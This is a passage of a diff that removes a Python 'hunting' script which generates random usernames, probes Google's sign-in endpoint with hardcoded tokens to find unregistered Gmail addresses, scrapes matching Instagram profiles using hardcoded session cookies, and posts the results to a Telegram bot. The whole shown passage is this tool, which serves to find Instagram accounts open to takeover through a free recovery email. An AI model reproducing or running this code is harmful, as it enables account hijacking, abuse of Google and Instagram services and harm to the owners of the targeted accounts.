-            'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1308.1016 Safari/537.36',
-            'x-chrome-uma-enabled':'1',
-            'x-same-domain':'1'
-            }
-
-		data = {
-            'theme': 'glif',
-            'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-            'f.req': f'["TL:{TLL2}","{email}",0,0,0,null,0,15856]',
-            'at': 'AFoagUV7ayPwNwcTzAJd8hG5bsUQ9UspxA:1695553167761',
-            'azt': 'AFoagUXaPxbm3Wne7jhJpuTr_KRQXXYYHQ:1695553167761',
-            'cookiesDisabled': 'false',
-            'deviceinfo': f'[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"{uui}",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-            'gmscoreversion': 'undefined',
-            'flowName': 'GlifWebSignIn',
-            'checkConnection': '',
-            'checkedDomains': 'youtube',
-            'pstMsg': '1'
-            }
-		response = requests.post(link,headers=headers,data=data).text
-		if ('"gf.uar",1') in response:		  		
-		  		print(F+f'Available Gm : [{email}]')
-		  		try:
-		  			he={
-'accept': '*/*',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'ar,en;q=0.9',
-'cookie': f'ig_did={uuid4}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z; ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140; dpr=1.25',
-'referer': f'https://www.instagram.com/{email}/?hl=ar',
-'sec-ch-prefers-color-scheme': 'dark',
-'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Windows"',
-'sec-ch-ua-platform-version': '"10.0.0"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'user-agent': generate_user_agent(),
-'viewport-width': '1051',
-'x-asbd-id': '198387',
-'x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy',
-'x-ig-app-id': '936619743392459',
-'x-ig-www-claim': '0',
-'x-requested-with': 'XMLHttpRequest',}
-		  			user_hunt = email.split('@')[0]
-		  			user = user_hunt
-		  			Response = GetInfoInsta(user_hunt)
-		  			Name = Response['name']
-		  			Id = Response['id']
-		  			flos = Response['followers']
-		  			flog = Response['following']
-		  			po = Response['posts']
-		  			da = Response['date']
-		  			L7Nhunt = (f"""
-DoNe Sir!! </>
-এ〔 𝗇𝖺𝗆𝖾 〕: {name}
-এ〔 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾 〕:  @{user}
-এ〔 𝖾𝗆𝖺𝗂𝗅 〕: {email}
-এ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 〕: {flos}
-এ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 〕:  {flog}
-এ〔 𝗉𝗈𝗌𝗍 〕:  {po}
-এ〔 𝖽𝖺𝗍𝖾 〕:  {da} 
-এ〔 𝖻𝗒 〕: @m_aBd""")
-		  			requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(L7Nhunt))
-		  		except:
-		  			L7Nhunt = (f"""
-DoNe Sir!! </>
-এ〔 𝗇𝖺𝗆𝖾 〕: {name}
-এ〔 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾 〕:  @{user}
-এ〔 𝖾𝗆𝖺𝗂𝗅 〕: {email}
-এ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 〕: {flos}
-এ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 〕:  {flog}
-এ〔 𝗉𝗈𝗌𝗍 〕:  {po}
-এ〔 𝖽𝖺𝗍𝖾 〕:  {da} 
-এ〔 𝖻𝗒 〕: @m_aBd""")
-		  			requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(L7Nhunt))			
-		else:				
-				print(X+f'Unvailable Gm : [{email}]')
-	else:												
-				print(R+f'Unvailable IG : [{email}@gmail.com]')
-
-				
-def L7Nlist():
- while True:
-  try:
-  	user='1234567890.qwertyuiopasdfghjklzxcvbnm'
-  	num='678'
-  	rng=int("".join(random.choice(num)for i in range(1)))
-  	name=str("".join(random.choice(user)for i in range(rng)))
-  	email = name
-  	L7Ngmail(email)
-  except:
-  	L7N_E=0
-L7N_prox = threading.Thread(target=L7Nlist,args=())
-L7N_prox.start()
-proxy_list = []
-for i in range(2):
-                      t = threading.Thread(target=L7Nlist)
-                      t.start()
-                      proxy_list.append(t)
-                      time.sleep(0.01)
-      
-# 280 line 🇮🇶🇮🇶			
